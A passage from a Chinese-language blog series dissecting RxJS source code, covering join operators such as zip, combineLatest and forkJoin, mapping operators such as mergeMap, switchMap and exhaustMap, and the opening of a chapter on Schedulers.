= [];private subscriptions: Subscription[] = []; 订阅后上游流输出 Observable 会由 observables 缓存起来，而后在上游流输出完成时，对他们进行订阅，并保存订阅对象。 12345678910111213141516171819protected _complete() { const observables = this.observables; const len = observables.length; if (len === 0) { this.destination.complete(); } else { for (let i = 0; i &lt; len &amp;&amp; !this.hasFirst; i++) { let observable = observables[i]; let subscription = subscribeToResult(this, observable, observable as any, i); if (this.subscriptions) { this.subscriptions.push(subscription); } this.add(subscription); } this.observables = null; }} notify在 notifyNext 中，RaceSubscriber 可以获取下游流的订阅数据。并对 hasFirst 进行判断。如果该数据是第一个到达，更新 hasFirst 状态，并将其余下游流的订阅取消，这样做的目的是为了只让这个下游流的数据发送给终结订阅。 123456789101112131415161718192021222324notifyNext( outerValue: T, innerValue: T, outerIndex: number, innerIndex: number, innerSub: InnerSubscriber&lt;T, T&gt;): void { if (!this.hasFirst) { // 更新状态 this.hasFirst = true; // for (let i = 0; i &lt; this.subscriptions.length; i++) { if (i !== outerIndex) { let subscription = this.subscriptions[i]; subscription.unsubscribe(); this.remove(subscription); } } this.subscriptions = null; } this.destination.next(innerValue);} zipzip 是这样的一种操作符，它以下游流中数据量最少的流为基准，按照先后顺序与其余的下游流结合成新的流。 1234567891011let age$ = of&lt;number&gt;(27, 25, 29, 30, 35, 40);let name$ = of&lt;string&gt;(&quot;Foo&quot;, &quot;Bar&quot;, &quot;Beer&quot;);let isDev$ = of&lt;boolean&gt;(true, true);zip(age$, name$, isDev$) .pipe(map(([age, name, isDev]) =&gt; ({ age, name, isDev }))) .subscribe((x) =&gt; console.log(x));// outputs// { age: 27, name: 'Foo', isDev: true }// { age: 25, name: 'Bar', isDev: true } zip 也一样，通过 fromArray 的方式，将输入内容交由内部订阅器处理。 123456export function zip&lt;O extends ObservableInput&lt;any&gt;, R&gt;( ...observables: O[]): Observable&lt;ObservedValueOf&lt;O&gt;[] | R&gt; { // 通过 fromArray 将传入的参数以流的形式进入到订阅中 return fromArray(observables, undefined).lift(new ZipOperator());} ZipSubscriber订阅开始，生成 ZipSubscriber，调用 _next。根据输入流的类型，将其传入到不同的迭代器中，输入的流的数据类型包含了以下几种： 数组 生成器 或 迭代器 Observable 12345678910protected _next(value: any) { const iterators = this.iterators; if (isArray(value)) { iterators.push(new StaticArrayIterator(value)); } else if (typeof value[Symbol_iterator] === 'function') { iterators.push(new StaticIterator(value[Symbol_iterator]())); } else { iterators.push(new ZipBufferIterator(this.destination, this, value)); }} 相较于 静态数据而言，Observable 才是我们关注的重点。在前面已经讲过 OuterSubscriber 的作用，我在这里不再赘述。 ZipBufferIterator 通过继承 OuterSubscriber，并实现了相应的操作，然后维护了这些 Observable 并进行订阅。 在 zip 中，上游流为 fromArray 生成的 Observable。当它完成时，会把 next 中存储的迭代器进行循环调用。在 next 的时候我们可以看到，会生成与 ObservableInput 相对应的内容 ，的内部如果实现了订阅功能，那么就订阅这些迭代器，否则，直接按照静态处理。 123456789101112131415161718192021222324protected _complete() { const iterators = this.iterators; const len = iterators.length; this.unsubscribe(); if (len === 0) { this.destination.complete(); return; } this.active = len; for (let i = 0; i &lt; len; i++) { let iterator: ZipBufferIterator&lt;any, any&gt; = &lt;any&gt;iterators[i]; if (iterator.stillUnsubscribed) { const destination = this.destination as Subscription; // 持有并管理该迭代器的订阅 destination.add(iterator.subscribe(iterator, i)); } else { // 不是 Observable this.active--; } }} ZipBufferIterator 继承了 OuterSubscriber ，那么它肯定也是通过内部维护一个 InnerSubscriber 来将下游流中的数据转发出去。 12345678class ZipBufferIterator&lt;T, R&gt; extends OuterSubscriber&lt;T, R&gt; implements LookAheadIterator&lt;T&gt; { ... subscribe(value: any, index: number) { const subscriber = new InnerSubscriber(this, index as any, undefined); return subscribeToResult&lt;any, any&gt;(this, this.observable, undefined, undefined, subscriber); } ...} notifyZipBufferIterator 其内部维护了 InnerSubscriber ，那么意味着数据会由发送到 notifyNext 中，这里使用了一个数组将数据缓存起来。 123456notifyNext(outerValue: T, innerValue: any, outerIndex: number, innerIndex: number, innerSub: InnerSubscriber&lt;T, R&gt;): void { this.buffer.push(innerValue); this.parent.checkIterators();} 而后，会调用 ZipSubscriber.checkIterators， 这个方法决定了终结订阅的数据来源，同时也给出了终结订阅完成所需要的条件。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546checkIterators() { const iterators = this.iterators; const len = iterators.length; const destination = this.destination; // 是不是所有的迭代器都存在数据。 for (let i = 0; i &lt; len; i++) { let iterator = iterators[i]; if (typeof iterator.hasValue === 'function' &amp;&amp; !iterator.hasValue()) { return; } } let shouldComplete = false; // 终结订阅最终拿到的数据 const args: any[] = []; for (let i = 0; i &lt; len; i++) { let iterator = iterators[i]; let result = iterator.next(); // 判断迭代器是否已经完成数据输出 if (iterator.hasCompleted()) { shouldComplete = true; } // 如果结果已经到了末尾，意味着最短的数据已经输出完毕。 // 有可能数据没到末尾，但是该迭代器已经结束。 if (result.done) { destination.complete(); return; } // 收集所有迭代器中的数据。 args.push(result.value); } // 发送给终结订阅 destination.next(args); // if (shouldComplete) { destination.complete(); }} 当某一个下游流完成的时候，缓冲区的存在与否会决定终结订阅的是否完成。 12345678notifyComplete() { if (this.buffer.length &gt; 0) { this.isComplete = true; this.parent.notifyInactive(); } else { this.destination.complete(); }} 如果缓冲区存在数据，那么还得去调用 ZipSubscriber.notifyInactive ，将信息返回给 ZipSubscriber。到了这一步，意味着某一个下游流已经完全发送完数据了，那么还得更新 active 的记录。如果 active 最终为 0 ，那么将通知终结订阅这个流已经完成了。 123456notifyInactive() { this.active--; if (this.active === 0) { this.destination.complete(); }} CombineLatest跟 zip 不一样，在 CombineLatest 中，每一个下游流的新数据都会和其余下游流的当前的数据相结合，从而形成新的数据并从新的流中转发出去。 123456789101112131415export function combineLatest&lt;O extends ObservableInput&lt;any&gt;, R&gt;( ...observables: O[]): Observable&lt;R&gt; { return fromArray(observables).lift( new CombineLatestOperator&lt;ObservedValueOf&lt;O&gt;, R&gt;() );}export class CombineLatestOperator&lt;T, R&gt; implements Operator&lt;T, R&gt; { constructor() {} call(subscriber: Subscriber&lt;R&gt;, source: any): any { return source.subscribe(new CombineLatestSubscriber()); }} 起始状态跟 zip 一样，也是通过 fromArray 将 ObservableInput 作为上游流的数据输入到 CombineLatestSubscriber 中。把目光锁定这个 Subscriber，深入了解一下它的心路历程。 CombineLatestSubscriber当数据到来的时候，CombineLatestSubscriber 把下游流集体缓存到一个 observables 数组中。 1234protected _next(observable: any) { this.values.push(NONE); this.observables.push(observable);} 当下游流缓存完毕的时候，上游流也输出完毕，那么便会调用 complete。 在这里，complete 做的事情仅仅是将所有的下游流进行订阅，并记录这些流的订阅状态。 123456789101112131415protected _complete() { const observables = this.observables; const len = observables.length; if (len === 0) { this.destination.complete(); } else { this.active = len; this.toRespond = len; for (let i = 0; i &lt; len; i++) { const observable = observables[i]; const innerSub = new InnerSubscriber(this, observable, i); this.add(subscribeToResult(this, observable, undefined, undefined, innerSub)); } }} 在订阅完毕所有的下游流后，它们的数据全都会流到 notify 中。 notifyCombineLatestSubscriber 每接收到一个下游流的数据，都会触发 notifyNext。toRespond 记录的是剩余未收到数据的下游流的数量， 当所有下游流都有数据的时候，那么才会开始结合。 values 通过初始化的索引缓存了每一个下游流当前的数据，当任意一个下游流的数据到来后，都将会更新 values 中对应索引中的缓存数据。 1234567891011121314151617181920212223notifyNext(outerValue: T, innerValue: R, outerIndex: number, innerIndex: number, innerSub: InnerSubscriber&lt;T, R&gt;): void { const values = this.values; const oldVal = values[outerIndex]; let toRespond = 0; if (this.toRespond) { // 如果这个数据为NONE，那么则代表当前的 // 下游流是首次发送数据，则 toRespond // 要减一。 if (oldVal === NONE) { this.toRespond -= 1; } toRespond = this.toRespond; } values[outerIndex] = innerValue; if (toRespond === 0) { this.destination.next(values.slice()); }} 以上便是 combineLastest 的核心设计。 至于 notifyComplete ，则是处理了当前正在运行的下游流和终结订阅的关系。当 active 减少到零的时候，意味着需要通知终结订阅所有数据已经输出完毕了。 123456notifyComplete(unused: Subscriber&lt;R&gt;): void { this.active -= 1; if (this.active === 0) { this.destination.complete(); }} forkJoin相较于 combineLatest ，forkJoin 是一种更为激进的实现。为什么说它激进，因为它判断合并的条件，从下游流有数据输出变成了下游流完成数据输出。它的实现很简单，只需要计算每个结束输出数据的下游流的数量 completed，通过比较 completed 和下游流总数，就能判断什么时候结束。需要注意的一点，如果所有流都输出了数据，那么 forkJoin 才能把数据发送。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152function forkJoinInternal( sources: ObservableInput&lt;any&gt;[], keys: string[] | null): Observable&lt;any&gt; { return new Observable((subscriber) =&gt; { const len = sources.length; if (len === 0) { subscriber.complete(); return; } const values = new Array(len); let completed = 0; let emitted = 0; // 循环订阅所有的下游流 for (let i = 0; i &lt; len; i++) { // 将输入转换成 Observable const source = from(sources[i]); let hasValue = false; subscriber.add( source.subscribe({ next: (value) =&gt; { if (!hasValue) { hasValue = true; emitted++; } // 记录当前订阅的值 values[i] = value; }, error: (err) =&gt; subscriber.error(err), // 处理完成时所需要做的工作 complete: () =&gt; { // 更新下游流订阅完成数 completed++; // 判断是否所有的下游流订阅都已经完成 if (completed === len || !hasValue) { if (emitted === len) { // 如果全部的下游流都发送了数据， // 那么终结订阅将收到所有的下游流 // 的数据。 subscriber.next(values); } subscriber.complete(); } }, }) ); } });} merge &amp; concatmerge 通过调用 mergeMap 来创建合并流，concat 也是通过 mergeMap 来创建相同的合并流。这一部分会在下一章讲到。它们两个唯一不同的点就是在于并发的数量上。merge 可以并发订阅多个下游流，而 concat 同一时间只能订阅一个下游流。 merge 源码123456789101112type Any = ObservableInput&lt;any&gt;;export function merge&lt;T, R&gt;( ...observables: Array&lt;ObservableInput&lt;any&gt; | number&gt;): Observable&lt;R&gt; { let concurrent = Number.POSITIVE_INFINITY; let last: any = observables[observables.length - 1]; if (typeof last === &quot;number&quot;) { concurrent = &lt;number&gt;observables.pop(); } return mergeMap&lt;Any, Any&gt;((x) =&gt; x, concurrent)(fromArray&lt;any&gt;(observables));} concat 源码12345export function concat1&lt;O extends ObservableInput&lt;any&gt;, R&gt;( ...observables: Array&lt;O&gt;): Observable&lt;R&gt; { return mergeMap&lt;O, O&gt;((x) =&gt; x, 1)(of(...observables));} partitionpartion 是一种分割操作，通过传入一个判断函数，使得输出的流一分为二。它通过 filter 来实现，将两个不同的流分离。其中需要注意的是，第二个 filter 中，传入的是一个求反操作。 123456789101112export function partition&lt;T&gt;( predicate: (value: T, index: number) =&gt; boolean, thisArg?: any): UnaryFunction&lt;Observable&lt;T&gt;, [Observable&lt;T&gt;, Observable&lt;T&gt;]&gt; { return (source: Observable&lt;T&gt;) =&gt; [ filter(predicate, thisArg)(source), // 此处传入的是一个 not，他把整个 predicate 封装。 filter(not(predicate, thisArg) as any)(source), ] as [Observable&lt;T&gt;, Observable&lt;T&gt;];}","link":"/front-end/angular_rxjs_4/"},{"title":"RxJS 源码解析(五): Operator III","text":"在本文开始之前，先定义一些自定义术语，方便阅读。 顶流：调用了操作符的流。 上游流：操作符的内部订阅器所订阅的流。 下游流：由操作符的内部订阅器管理的流。 终结订阅：订阅了操作符生成的流的订阅者。 在上一篇中，我描述了 OuterSubscriber 和 InnerSubscriber 的作用，并将几个 Join Creation Operator 的源码解析了一遍。下面，我们将进入的是 Transformation Operator 的源码分析。 在知道了 OuterSubscriber 和 InnerSubscriber 是一种通过委托模式实现管理下游流订阅的方法后，我发现其实这种实现技巧用于很多的 operators。那么本篇及下一篇将会介绍更多这种类似的设计。 作者：zcx链接：https://mp.weixin.qq.com/s/lrawMOuHNj6GyQJMqK1Now 基础映射map map 是最为基础的映射，他将上游流的值经过运算，转发给下游订阅。这部分源码不是很复杂，实际上就是做了一层转发。 1234567891011protected _next(value: T) { let result: R; try { result = this.project.call(this.thisArg, value, this.count++); } catch (err) { this.destination.error(err); return; } this.destination.next(result);} scan Scan 和 的作用跟 reduce 一样，传入一个函数把一组数据打平，但是跟 reduce 不一样的点在于，每一次结合完毕都会立刻返回结果。 12345678const clicks1 = fromEvent(document, &quot;click&quot;);const ones1 = clicks.pipe(mapTo(1));const seed1 = 0;const count1 = ones.pipe( // 输入的是返回任意值的函数 scan((acc, one) =&gt; acc + one, seed));count.subscribe((x) =&gt; console.log(x)); 这部分的实现同样也不是很复杂，在拿到上游流数据后，使用 accumulator 对数据进行累加操作。 123456789101112131415161718192021222324protected _next(value: T): void { // 需要判断是否带有初始值。 if (!this.hasSeed) { this.seed = value; this.hasSeed = true; this.destination.next(value); } else { return this._tryNext(value); }}private _tryNext(value: T): void { const index = this.index++; let result: any; try { // 计算结果 result = this.accumulator(&lt;R&gt;this.seed, value, index); } catch (err) { this.destination.error(err); } // 保存，以备下次使用 this.seed = result; this.destination.next(result);} 五种基础复合映射所谓复合映射，意思就是这些操作符接收的参数是一个带有上游流数据作为参数并返回 Observable 的函数，同时把其中的订阅数据转发给下游订阅。 mergeMap，switchMap，exhaustMap，concatMap，mergeScan 是五种复合映射操作符，它使得上游流的数据可以传递给下游流，并交由其处理。concatMap 和 mergeScan 是 mergeMap 的特殊情况，所以我们只需要关注剩余的三种。 mergeMap，switchMap，exhaustMap，这三种操作符的源码结构分为这三个部分： 通过 lift 操作，将原有的流映射成新的流。 实现 Operator 接口，通过 call 返回一个 Subscriber。 通过继承 OuterSubscriber 实现这个 Subscriber。 其中，前两个部分都拥有非常类似的结构，都是通过这种样板代码来进行编写。 123456789101112131415export function someMap&lt;T, R, O extends ObservableInput&lt;any&gt;&gt;( project: (value: T, index: number) =&gt; O): OperatorFunction&lt;T, ObservedValueOf&lt;O&gt; | R&gt; { return (source: Observable&lt;T&gt;) =&gt; source.lift(new SomeMapOperator(project));}class SomeMapOperator&lt;T, R&gt; implements Operator&lt;T, R&gt; { constructor( private project: (value: T, index: number) =&gt; ObservableInput&lt;R&gt; ) {} call(Subscriber: Subscriber&lt;R&gt;, source: any): any { return source.subscribe(new SomeMapSubscriber(Subscriber, this.project)); }} 通过 _innerSub 提供的内部注册方法，在里面创建 InnerSubscriber，并传入当前的 OuterSubscriber 。 1234567891011121314private _innerSub(input: ObservableInput&lt;R&gt;, value: T, index: number): void { const innerSubscriber = new InnerSubscriber(this, value, index); const destination = this.destination as Subscription; destination.add(innerSubscriber); const innerSubscription = subscribeToResult&lt;T, R&gt;(this, input, undefined, undefined, innerSubscriber); // 因为这里的 input 可能不是 observable， 那么返回的 // 订阅结果也可能跟 innserSubscriber 相等，所以这里要 // 处理一下。 if (innerSubscription !== innerSubscriber) { destination.add(innerSubscription); }} 最终，交由 subscribeToResult 创建一个内部订阅来管理下游流。 mergeMap mergeMap 提供的是一种合并操作，通过在内部维护了多个下游流的订阅，使得上游流可以将数据下发给多个下游流。它提供了一个并发数限制的参数，主要用于控制下游流并发的数量。 1234567export function mergeMap&lt;T, R, O extends ObservableInput&lt;any&gt;&gt;( project: (value: T, index: number) =&gt; O, concurrent: number = Number.POSITIVE_INFINITY): OperatorFunction&lt;T, ObservedValueOf&lt;O&gt; | R&gt; { return (source: Observable&lt;T&gt;) =&gt; source.lift(new MergeMapOperator(project, concurrent));} 下面，我们关注的点将转移到 MergeMapSubscriber 。首先看看它的数据结构。 12345678910111213141516171819202122export class MergeMapSubscriber&lt;T, R&gt; extends OuterSubscriber&lt;T, R&gt; { // 标记是否已经完成 private hasCompleted: boolean = false; // 上流 observable 的数据缓存 private buffer: T[] = []; // 当前正在开启的流的数量 private active: number = 0; // 数据的索引 protected index: number = 0; constructor( // 外部传入的订阅者 destination: Subscriber&lt;R&gt;, // 需要合并的 Observable 的工厂 private project: (value: T, index: number) =&gt; ObservableInput&lt;R&gt;, // 并发数量 private concurrent: number = Number.POSITIVE_INFINITY,) { super(destination); } ...} SubscriberMergeMapSubscriber 的 _next 调用的时候，会比较 active （下游流的数量） 与 concurrent （最大并发数）的大小，active 小于 concurrent 则调用 _tryNext，否则将已经到来的数据放入缓冲区中，但是你知道的， JavaScript 并没有真正的并发，这就是一个异步队列。而每一次进行 _tryNext，都会通过 project 来创建一个下游流，同时让更新 active，将下游流传入并触发 _innerSub。 12345678910111213141516171819202122protected _next(value: T): void { if (this.active &lt; this.concurrent) { this._tryNext(value); } else { this.buffer.push(value); }}protected _tryNext(value: T) { let result: ObservableInput&lt;R&gt;; const index = this.index++; try { result = this.project(value, index); } catch (err) { this.destination.error(err); return; } this.active++; // this._innerSub(result, value, index);} 在上游流完成时，会触发 _complete。 1234567protected _complete(): void { this.hasCompleted = true; if (this.active === 0 &amp;&amp; this.buffer.length === 0) { this.destination.complete(); } this.unsubscribe();} 如果所有的下游流都已经完成，且缓冲区中没有数据，则通知下游订阅数据已经输出完毕。 notifynotifyNext 就是单纯的将结果传递给下游订阅，而 notifyComplete 则有意思多了。 通过 notifyComplete ，可以得知哪些流已经完成任务并且关闭。如果 buffer 中存在数据，那么将数据交由 _next 发送出去并创建新的下游流。过这种递归操作，可以将所有 buffer 中的数据都发送出去。最后判断上游流和下游流是不是都已经结束了，如果已经结束了，则通知下游订阅数据已经输出完毕。 12345678910111213141516171819notifyNext( outerValue: T, innerValue: R, outerIndex: number, innerIndex: number, innerSub: InnerSubscriber&lt;T, R&gt;): void { this.destination.next(innerValue);}notifyComplete(innerSub: Subscription): void { const buffer = this.buffer; this.remove(innerSub); this.active--; if (buffer.length &gt; 0) { this._next(buffer.shift()); } else if (this.active === 0 &amp;&amp; this.hasCompleted) { this.destination.complete(); }} switchMap switchMap 提供的是一个上游流为主的映射操作，当上游流的订阅数据到来的时候，旧的下游流会被取消订阅，然后重新订阅一组新的下游流。 12345export function switchMap&lt;T, R, O extends ObservableInput&lt;any&gt;&gt;( project: (value: T, index: number) =&gt; O): OperatorFunction&lt;T, ObservedValueOf&lt;O&gt; | R&gt; { return (source: Observable&lt;T&gt;) =&gt; source.lift(new SwitchMapOperator(project));} SubscriberinnerSubscription 保存了当前下游流的订阅，所以这个操作符只会维护一个下游流的订阅。 12private index: number = 0;private innerSubscription: Subscription; 当进行 next 操作的时候，会先创建新的下游流，如果旧的下游流存在，那么会被取消订阅。 12345678910111213141516171819protected _next(value: T) { let result: ObservableInput&lt;R&gt;; const index = this.index++; try { // 上游流的数据到来了，创建新的下游流。 result = this.project(value, index); } catch (error) { this.destination.error(error); return; } // 旧的下游流取消订阅 const innerSubscription = this.innerSubscription; if (innerSubscription) { innerSubscription.unsubscribe(); } this._innerSub(result, value, index);} 该 Subscriber 重写了_complete 。这里意味着上游流已经输出完毕，那么如果下游订阅 123456789protected _complete(): void { const {innerSubscription} = this; if (!innerSubscription || innerSubscription.closed) { super._complete(); return; } this.unsubscribe();} notify跟之前一样， notifyNext 依旧是将下游流中的数据转发出去。主要关注点还是在于 notifyComplete。因为 innerSubscription 被置为空了，所以调用 this._complete 无意义，不会触发到其父类函数。 12345678notifyComplete(innerSub: Subscription): void { const destination = this.destination as Subscription; destination.remove(innerSub); this.innerSubscription = null; if (this.isStopped) { super._complete(); }} 如果当前的下游流已经完成了，那么就要将它从下游订阅（destination）中移除，如果上游流已经停止（error 或者 complete 被调用，或者被取消订阅），那么还得调用 super._complete 表示已经完成。 exhaustMap 跟 switchMap 相反， exhaustMap 提供了一种以下游流为主的映射操作。如果下游流已经开启，那么上游流之后到来的订阅数据都将会被抛弃，直到该下游流完成订阅。下游流完成订阅后，上游流的数据才会继续跟新的下游流结合，并形成新的订阅。 123456export function exhaustMap&lt;T, R, O extends ObservableInput&lt;any&gt;&gt;( project: (value: T, index: number) =&gt; O): OperatorFunction&lt;T, ObservedValueOf&lt;O&gt; | R&gt; { return (source: Observable&lt;T&gt;) =&gt; source.lift(new ExhaustMapOperator(project));} SubscriberexhaustMap 的实现很简单，通过维护 hasSubscription 这样一个内部状态，标记下游流是否被订阅了。hasCompleted 则是上游流完成情况的标记。 12private hasSubscription = false;private hasCompleted = false; 订阅会调用 _next，标记下游流是否已经开启（订阅是否已经存在），如果未开启，则构建新的下游流，并标记 hasSubscription 为 true。 123456789101112131415protected _next(value: T): void { if (!this.hasSubscription) { let result: ObservableInput&lt;R&gt;; const index = this.index++; try { result = this.project(value, index); } catch (err) { this.destination.error(err); return; } // 标记为 true this.hasSubscription = true; this._innerSub(result, value, index); }} 上游流和下游流的数据都已经输出完毕了，那么把完成信号传递给下游订阅。 1234567protected _complete(): void { this.hasCompleted = true; if (!this.hasSubscription) { this.destination.complete(); } this.unsubscribe();} notify如果下游流的数据输出完毕，那么就应该要将 hasSubscription 标记为 false。 12345678910111213notifyComplete(innerSub: Subscription): void { const destination = this.destination as Subscription; destination.remove(innerSub); // 标记为 false this.hasSubscription = false; // 此处判断上游流是否已经完成 if (this.hasCompleted) { this.destination.complete(); }} concatMapconcatMap 是 mergeMap 的一种特殊形式。 12345export function concatMap&lt;T, R, O extends ObservableInput&lt;any&gt;&gt;( project: (value: T, index: number) =&gt; O): OperatorFunction&lt;T, ObservedValueOf&lt;O&gt; | R&gt; { return mergeMap(project, 1);} mergeScanmergeScan 的源码跟 mergeMap 类似。只不过就是把传入的函数替换了一下，并且在内部缓存了上一个结合后的值。 1234567const clicks2 = fromEvent(document, &quot;click&quot;);const ones2 = click$.pipe(mapTo(1));const seed2 = 0;const count2 = one$.pipe( // 输入一个 Observable 工厂 mergeScan((acc, one) =&gt; of(acc + one), seed)); concat &amp; merge上一篇中，关于 concat 和 merge 两个相关的 operators 并没有讲到，因为这它们其实最终都是调用 mergeMap。 小结通过这三个不同的映射操作符，使得上游流可以通过一定的方式跟下游流结合。那么，结合一张图，可以看看相关操作符的关系。 对这些操作符分一下类: 属于 Transformation Operators 的有：concatMap， concatMapTo， mergeMap， mergeMapTo， switchMap，switchMapTo，exhaustMap，exhaustMapTo。 属于 Join Creation Operators 的有：merge, concat。 属于 Join Operators 的有：mergeAll， concatAll， switchAll， startWith，endWith。 零散的高阶操作符expand expand 将传入的 Observable 工厂进行递归操作。与上面的复合映射类似，expand 也是一种复合映射，只不过，他会不断的去复合下游流的数据，也就是类似上图的模式。 Subscriber为了实现相对应的功能，expand 定义了以下数据结构。 1234567891011121314export class ExpandSubscriber&lt;T, R&gt; extends OuterSubscriber&lt;T, R&gt; { // 当前索引 private index: number = 0; // 已启动的下游流的数量 private active: number = 0; // 上游流是否已经完成 private hasCompleted: boolean = false; // 对于索引的缓存数据 private buffer: any[]; // 下游流工厂 private project: (value: T, index: number) =&gt; ObservableInput&lt;R&gt;, // 并发数 private concurrent: number;} 上游流数据到来的时候，跟 mergeMap 比较类似，也会比较 active 和 concurrent，如果 active 大于 concurrent ，那么便会用 buffer 缓存上游流的数据，如果 active 小于 concurrent ，那么直接发送数据给到下游订阅，并订阅一个新的下游流。需要注意的一点，为了防止爆栈，expand 在这里加了一个判断条件，在 notify 中，将利用这一条件，来结束递归。 1234567891011121314151617181920212223242526272829protected _next(value: any): void { const destination = this.destination; if (destination.closed) { this._complete(); return; } const index = this.index++; if (this.active &lt; this.concurrent) { destination.next(value); try { const { project } = this; const result = project(value, index); this.subscribeToProjection(result, value, index); } catch (e) { destination.error(e); } } else { this.buffer.push(value); }}// 订阅新的下游流private subscribeToProjection(result: any, value: T, index: number): void { this.active++; const destination = this.destination as Subscription; destination.add(subscribeToResult&lt;T, R&gt;(this, result, value, index));} 当上游流完成时，需要标记 hasComplete 为 true。这一步是结束递归的重要标志。 12345678protected _complete(): void { this.hasCompleted = true; if (this.hasCompleted &amp;&amp; this.active === 0) { this.destination.complete(); } this.unsubscribe();} notify那么 expand 是怎么构成递归的呢，当下游流有数据到来的时候，他会直接调用 _next。最终形成了 _next -&gt; subscribeToProjection -&gt; next -&gt; notifyNext -&gt; _next 这样的一条递归链。 12345678910notifyNext( outerValue: T, innerValue: R, outerIndex: number, innerIndex: number, innerSub: InnerSubscriber&lt;T, R&gt;): void { this._next(innerValue);} 下游流完成时，需要根据 hasCompleted 和 buffer 的状态来决定是否结束递归。在这里，也形成了一条这样的递归链： _next -&gt; subscribeToProjection -&gt; next -&gt; notifyComplete -&gt; _next 。 123456789101112notifyComplete(innerSub: Subscription): void { const buffer = this.buffer; const destination = this.destination as Subscription; destination.remove(innerSub); this.active--; if (buffer &amp;&amp; buffer.length &gt; 0) { this._next(buffer.shift()); } if (this.hasCompleted &amp;&amp; this.active === 0) { this.destination.complete(); }} exhaust exhaust 是一种打平操作，它的源码并没有调用 exhaustMap。它的实现思路很简单，通过判断当前是否存在前一个下游流订阅（hasSubscription），来决定当前到来的下游流是否开启。 1234567891011121314151617181920212223242526private hasCompleted: boolean = false;private hasSubscription: boolean = false;protected _next(value: T): void { // 如果存在订阅，那么抛弃这个值 if (!this.hasSubscription) { this.hasSubscription = true; this.add(subscribeToResult(this, value)); }}protected _complete(): void { this.hasCompleted = true; if (!this.hasSubscription) { this.destination.complete(); }}notifyComplete(innerSub: Subscription): void { this.remove(innerSub); this.hasSubscription = false; if (this.hasCompleted) { this.destination.complete(); }}","link":"/front-end/angular_rxjs_5/"},{"title":"RxJS 源码解析(六): Scheduler","text":"在这之前，我一直都没有讲过 Scheduler 的作用，那么本章就开始讲解 Scheduler 的设计思路和基本结构。RxJS 的存在是为了处理异步 IO，而异步 IO 所包含的一系列 API 肯定也是要经过进一步的封装才能让 RxJS 中的异步操作使用。 可以看到，它主要还是根据 JS 的所能够提供的异步能力来设计这些基本结构。 AsyncScheduler 异步调度器，使用 setInterval 实现。 QueueScheduler 队列异步调度器，继承了 AsyncScheduler，但是 QueueAction 是一种链式结构，使得调度以迭代器的形式进行。 AnimationFrameScheduler 使用 reqeustAnimationFrame 实现了帧调度器。 AsapScheduler 使用 Promise.resolve().then() 实现的微任务调度器。 作者：zcx链接：https://mp.weixin.qq.com/s/vG0aaQmDy7Cqfv0CwJ_d0Q SchedulerLike 、 Scheduler &amp; Action首先，SchedulerLike 提供了以下两个接口。 1234567891011export interface SchedulerLike { // 标记当前时间 now(): number; // 开启调度的基础接口 schedule&lt;T&gt;( work: (this: SchedulerAction&lt;T&gt;, state?: T) =&gt; void, delay?: number, state?: T ): Subscription;} Scheduler 则实现了这些接口。 123456789101112131415161718192021export class Scheduler implements SchedulerLike { // 获取当前时间戳 public static now: () =&gt; number = () =&gt; Date.now(); constructor( private SchedulerAction: typeof Action, now: () =&gt; number = Scheduler.now ) { this.now = now; } public now: () =&gt; number; // 直接调用 action 的 schedule public schedule&lt;T&gt;( work: (this: SchedulerAction&lt;T&gt;, state?: T) =&gt; void, delay: number = 0, state?: T ): Subscription { return new this.SchedulerAction&lt;T&gt;(this, work).schedule(state, delay); }} Scheduler 为后续的继承它的调度器定义了创建方式，通过传入一个 Action 工厂，使得内部可以构造特定的 Action 。而 Action 继承了 Subscription，意味着 Action 实际上是一种的订阅器。 123456789101112export class Action&lt;T&gt; extends Subscription { constructor( scheduler: Scheduler, work: (this: SchedulerAction&lt;T&gt;, state?: T) =&gt; void ) { super(); } // Action 开始调度 public schedule(state?: T, delay: number = 0): Subscription { return this; }} 上面的设计是一种名为 Template Method 的设计模式，这种方法有效地约束了后续的不同的 Scheduler 的实现。 定义一个操作中的算法的骨架，而将一些步骤延迟到子类中。它使得子类可以不改变一个算法的结构即可重定义该算法的某些特定步骤。 异步调度器先来了解一下 Scheduler 的子类 AsyncScheduler，余下所有的 Scheduler 都会继承它。在这里，先不急着进行源码分析，我们需要先为了弄清楚调度器的运行原理，了解调度器是如何对异步 API 进行封装的。 首先，调度器本身也是基于观察者模式来进行设计，但是它又独立于 Rxjs 的 Observable。一般来说， AsyncScheduler 是这样调用的。 123456789101112const scheduler = AsyncScheduler(AsyncAction);const subscription = async.schedule( function (counter) { console.log(counter); // this 绑定了 AsyncAction this.schedule(counter + 1, 1000); }, 1000, 1);// subscription.unsubscribe(); 它的调用栈是这样的。 123456789AsyncScheduler.schedule;AsyncAction.schedule;AsyncAction.requestAsyncId;listOnTimeout; // 原生事件processTimers; // 原生事件AsyncScheduler.flush;AsyncAction.execute;AsyncAction._execute;AsyncAction.work; AsyncAction.schedule跟着调用栈分析源码来溯源，在 AsyncScheduler 的 schedule 方法中，它先构造了 AsyncAction ，然后调用它的 schedule 。在这个方法中，实际上是对 Action 的内部状态进行更新，所以此处关注的地方就是在于 schedule 如何触发异步 API。 123456789101112131415161718192021222324252627class AsyncAction&lt;T&gt; extends Action&lt;T&gt; { constructor( protected scheduler: AsyncScheduler, protected work: (this: SchedulerAction&lt;T&gt;, state?: T) =&gt; void ) { super(scheduler, work); } public schedule(state?: T, delay: number = 0): Subscription { if (this.closed) { return this; } this.state = state; const id = this.id; const scheduler = this.scheduler; // 需要对相应的异步 API 进行取消操作 if (id != null) { this.id = this.recycleAsyncId(scheduler, id, delay); } this.pending = true; this.delay = delay; // 重新配置异步 API this.id = this.id || this.requestAsyncId(scheduler, this.id, delay); return this; }} 可以看到，从 scheduler 传入的回调函数最终会被 Action 持有，所以调用栈最终执行的 work 实际上就是回调函数。 AsyncAction.requestAsyncIdrequestAsyncId 是调用异步 API 的方法，这个方法在 AsyncAction 最终触发了 setInterval 这一异步 API。那么实际上，根据 Template Method 的设计，所有继承 AsyncAction 的 Action 都会通过这个方法实现相对应的异步 API 。 至于 AsyncAction 为什么会使用 setInterval 而不是 setTimeout，源代码里是这样说明的。 Actions only execute once by default, unless rescheduled from within the scheduled callback. This allows us to implement single and repeat actions via the same code path, without adding API surface area, as well as mimic traditional recursion but across asynchronous boundaries. However, JS runtimes and timers distinguish between intervals achieved by serial setTimeout calls vs. a single setInterval call. An interval of serial setTimeout calls can be individufenally delayed, which delays scheduling the next setTimeout, and so on. setInterval attempts to guarantee the interval callback will be invoked more precisely to the interval period, regardless of load. Therefore, we use setInterval to schedule single and repeat actions. If the action reschedules itself with the same delay, 